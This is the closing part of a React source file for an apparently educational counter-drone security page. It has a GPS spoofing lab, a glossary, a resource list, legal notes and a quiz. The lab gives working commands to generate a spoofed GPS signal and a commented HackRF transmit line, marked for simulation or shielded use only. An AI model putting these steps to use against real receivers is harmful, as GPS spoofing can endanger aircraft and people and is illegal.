                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                        <Chip label="Advanced" size="small" sx={{ bgcolor: alpha(theme.error, 0.2), color: theme.error }} />
                        <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                          Lab 3: GPS Spoofing in Simulation
                        </Typography>
                      </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="warning" sx={{ mb: 2, bgcolor: alpha(theme.warning, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          <strong>Simulation Only!</strong> GPS spoofing is illegal over the air. Use only in shielded environment or simulation.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`# Lab 3: GPS Spoofing Simulation
# Requirements: gps-sdr-sim, SITL, RF-shielded environment

# 1. Get GPS ephemeris data
wget ftp://cddis.nasa.gov/gnss/data/daily/2024/001/24n/brdc0010.24n.Z
gunzip brdc0010.24n.Z

# 2. Generate GPS signal for specific location
# (Using gps-sdr-sim - SIMULATION ONLY)
./gps-sdr-sim -e brdc0010.24n -l 40.7128,-74.0060,100 -b 8 -o gpssim.bin

# 3. For hardware testing (SHIELDED ENCLOSURE ONLY):
# hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1

# 4. Test with SITL + simulated GPS
# Modify SITL to accept external GPS input
# Observe drone behavior with manipulated coordinates

# 5. Study effects:
# - Position jumps
# - Geofence triggering
# - RTH behavior
# - Flight controller logs

# Alternative: Use software GPS simulator
# gpsd with fake data for testing applications`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Glossary Section */}
              <Box id="glossary" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <MenuBookIcon /> Glossary
                  </Typography>

                  <Grid container spacing={2}>
                    {[
                      { term: "C-UAS", def: "Counter-Unmanned Aircraft Systems", cat: "General" },
                      { term: "UAS", def: "Unmanned Aircraft System (drone + controller + links)", cat: "General" },
                      { term: "BVLOS", def: "Beyond Visual Line of Sight operations", cat: "Operations" },
                      { term: "FPV", def: "First Person View - live camera feed piloting", cat: "Operations" },
                      { term: "RTH", def: "Return to Home - automatic return on signal loss", cat: "Features" },
                      { term: "Geofence", def: "Virtual boundary restricting drone flight", cat: "Features" },
                      { term: "MAVLink", def: "Micro Air Vehicle Link - open telemetry protocol", cat: "Protocol" },
                      { term: "FHSS", def: "Frequency Hopping Spread Spectrum", cat: "RF" },
                      { term: "RCS", def: "Radar Cross Section - radar detectability measure", cat: "Detection" },
                      { term: "Remote ID", def: "Broadcast identification for drones", cat: "Regulation" },
                      { term: "GNSS", def: "Global Navigation Satellite System (GPS, GLONASS, etc.)", cat: "Navigation" },
                      { term: "IMU", def: "Inertial Measurement Unit (gyro, accelerometer)", cat: "Sensors" },
                    ].map((item, idx) => (
                      <Grid item xs={12} md={6} key={idx}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%", border: `1px solid ${theme.border}` }}>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                            <Typography variant="subtitle2" sx={{ color: theme.primary, fontWeight: 600 }}>{item.term}</Typography>
                            <Chip
                              label={item.cat}
                              size="small"
                              sx={{
                                fontSize: "0.65rem",
                                height: 18,
                                bgcolor: alpha(theme.info, 0.2),
                                color: theme.info,
                              }}
                            />
                          </Box>
                          <Typography variant="body2" sx={{ color: theme.textMuted }}>{item.def}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </Paper>
              </Box>

              {/* Resources Section */}
              <Box id="resources" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <MenuBookIcon /> Resources
                  </Typography>

                  <Grid container spacing={3}>
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle1" sx={{ color: theme.secondary, mb: 2 }}>Open Source Projects</Typography>
                      <List dense>
                        {[
                          { name: "ArduPilot", desc: "Open-source autopilot software" },
                          { name: "PX4", desc: "Professional open-source drone platform" },
                          { name: "OpenDroneID", desc: "Remote ID receiver implementations" },
                          { name: "gps-sdr-sim", desc: "GPS signal simulator (research)" },
                          { name: "pymavlink", desc: "Python MAVLink library" },
                        ].map((item, idx) => (
                          <ListItem key={idx} sx={{ py: 0.5 }}>
                            <ListItemIcon sx={{ minWidth: 28 }}>
                              <BuildIcon sx={{ fontSize: 16, color: theme.success }} />
                            </ListItemIcon>
                            <ListItemText
                              primary={item.name}
                              secondary={item.desc}
                              primaryTypographyProps={{ variant: "body2", sx: { color: theme.text, fontWeight: 500 } }}
                              secondaryTypographyProps={{ variant: "caption", sx: { color: theme.textMuted } }}
                            />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle1" sx={{ color: theme.secondary, mb: 2 }}>Research & Conferences</Typography>
                      <List dense>
                        {[
                          { name: "DEF CON Drone Hacking Village", desc: "Annual drone security research" },
                          { name: "USENIX Security", desc: "Academic security papers on UAS" },
                          { name: "Black Hat", desc: "Drone vulnerability presentations" },
                          { name: "DroneSec", desc: "Drone security community" },
                        ].map((item, idx) => (
                          <ListItem key={idx} sx={{ py: 0.5 }}>
                            <ListItemIcon sx={{ minWidth: 28 }}>
                              <SchoolIcon sx={{ fontSize: 16, color: theme.primary }} />
                            </ListItemIcon>
                            <ListItemText
                              primary={item.name}
                              secondary={item.desc}
                              primaryTypographyProps={{ variant: "body2", sx: { color: theme.text, fontWeight: 500 } }}
                              secondaryTypographyProps={{ variant: "caption", sx: { color: theme.textMuted } }}
                            />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                  </Grid>
                </Paper>
              </Box>

              {/* Legal Section */}
              <Box id="legal" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <GavelIcon /> Legal & Ethical Considerations
                  </Typography>

                  <Alert severity="error" sx={{ mb: 3, bgcolor: alpha(theme.error, 0.1), color: theme.text }}>
                    <Typography variant="body2">
                      <strong>US Law (47 U.S.C. § 333):</strong> Jamming radio communications is a federal crime.
                      <strong> 18 U.S.C. § 32:</strong> Destroying aircraft (including drones) is a federal crime.
                    </Typography>
                  </Alert>

                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, borderLeft: `4px solid ${theme.success}` }}>
                        <Typography variant="subtitle2" sx={{ color: theme.success, mb: 1 }}>Generally Legal</Typography>
                        <List dense>
                          {[
                            "Passive RF monitoring/detection",
                            "Visual observation of drones",
                            "Testing on your own drones",
                            "Simulation and research",
                            "Authorized security assessments",
                          ].map((item, idx) => (
                            <ListItem key={idx} sx={{ py: 0, pl: 0 }}>
                              <ListItemIcon sx={{ minWidth: 20 }}>
                                <CheckCircleIcon sx={{ fontSize: 14, color: theme.success }} />
                              </ListItemIcon>
                              <ListItemText primary={item} primaryTypographyProps={{ variant: "caption", sx: { color: theme.textMuted } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, borderLeft: `4px solid ${theme.error}` }}>
                        <Typography variant="subtitle2" sx={{ color: theme.error, mb: 1 }}>Generally Illegal</Typography>
                        <List dense>
                          {[
                            "Jamming any radio frequencies",
                            "GPS spoofing (transmitting)",
                            "Shooting down drones",
                            "Hijacking others' drones",
                            "Interfering with aircraft operations",
                          ].map((item, idx) => (
                            <ListItem key={idx} sx={{ py: 0, pl: 0 }}>
                              <ListItemIcon sx={{ minWidth: 20 }}>
                                <WarningIcon sx={{ fontSize: 14, color: theme.error }} />
                              </ListItemIcon>
                              <ListItemText primary={item} primaryTypographyProps={{ variant: "caption", sx: { color: theme.textMuted } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                  </Grid>
                </Paper>
              </Box>

              {/* Quiz Section */}
              <Box id="quiz-section" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <QuizIcon /> Knowledge Check
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.textMuted, mb: 3 }}>
                    Test your understanding of Counter-UAS and drone security with {QUIZ_QUESTION_COUNT} randomly selected questions.
                  </Typography>
                  <QuizSection questions={quizQuestions} accentColor={theme.primary} questionsPerQuiz={QUIZ_QUESTION_COUNT} />
                </Paper>
              </Box>

              {/* Back Button */}
              <Box sx={{ textAlign: "center", mt: 4 }}>
                <Button
                  variant="outlined"
                  startIcon={<ArrowBackIcon />}
                  onClick={() => navigate("/learn")}
                  sx={{
                    borderColor: theme.primary,
                    color: theme.primary,
                    "&:hover": {
                      borderColor: theme.primaryLight,
                      bgcolor: alpha(theme.primary, 0.1),
                    },
                  }}
                >
                  Back to Learning Hub
                </Button>
              </Box>
            </Grid>
          </Grid>
        </Container>

        {/* Mobile Navigation Drawer */}
        <Drawer
          anchor="left"
          open={navDrawerOpen}
          onClose={() => setNavDrawerOpen(false)}
          PaperProps={{
            sx: { bgcolor: theme.bgCard, width: 280 },
          }}
        >
          <Box sx={{ p: 2 }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
              <Typography variant="subtitle1" sx={{ color: theme.primary, fontWeight: 600 }}>
                Navigation
              </Typography>
              <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: theme.text }}>
                <CloseIcon />
              </IconButton>
            </Box>
            <List>
              {sectionNavItems.map((item) => (
                <ListItem
                  key={item.id}
                  component="button"
                  onClick={() => scrollToSection(item.id)}
                  sx={{
                    borderRadius: 1,
                    mb: 0.5,
                    cursor: "pointer",
                    border: "none",
                    bgcolor: "transparent",
                    width: "100%",
                    textAlign: "left",
                    "&:hover": {
                      bgcolor: alpha(theme.primary, 0.1),
                    },
                  }}
                >
                  <ListItemIcon sx={{ minWidth: 32, color: theme.primary }}>
                    {item.icon}
                  </ListItemIcon>
                  <ListItemText
                    primary={item.label}
                    primaryTypographyProps={{
                      variant: "body2",
                      sx: { color: theme.text },
                    }}
                  />
                </ListItem>
              ))}
            </List>
          </Box>
        </Drawer>

        {/* Mobile FABs */}
        <Box
          sx={{
            display: { xs: "flex", md: "none" },
            position: "fixed",
            bottom: 16,
            right: 16,
            flexDirection: "column",
            gap: 1,
          }}
        >
          <Fab
            size="small"
            onClick={scrollToTop}
            sx={{ bgcolor: theme.bgCard, color: theme.text, "&:hover": { bgcolor: theme.bgNested } }}
          >
            <KeyboardArrowUpIcon />
          </Fab>
        </Box>
      </Box>
    </LearnPageLayout>
  );
};

export default CounterUASPage;
